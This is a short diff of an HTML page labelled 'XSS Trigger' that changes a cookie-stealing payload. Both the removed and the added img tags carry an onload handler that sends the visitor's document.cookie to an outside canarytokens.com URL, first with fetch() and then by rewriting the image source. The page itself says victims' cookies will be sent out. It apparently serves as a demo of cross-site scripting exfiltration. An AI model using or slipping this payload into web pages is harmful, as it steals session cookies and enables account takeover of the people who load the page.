@@ -10,8 +10,8 @@
     <p>If you are a victim, your cookies will be sent to Canary.</p>
 
     <!-- XSS Trigger -->
-    <img src="https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg" 
-        onload="fetch('https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&cookies=' + encodeURIComponent(document.cookie))" />
-    
+    <img src="https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&cookies=" 
+        onload="this.src='https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&cookies=' + encodeURIComponent(document.cookie)" />
+        
 </body>
 </html>
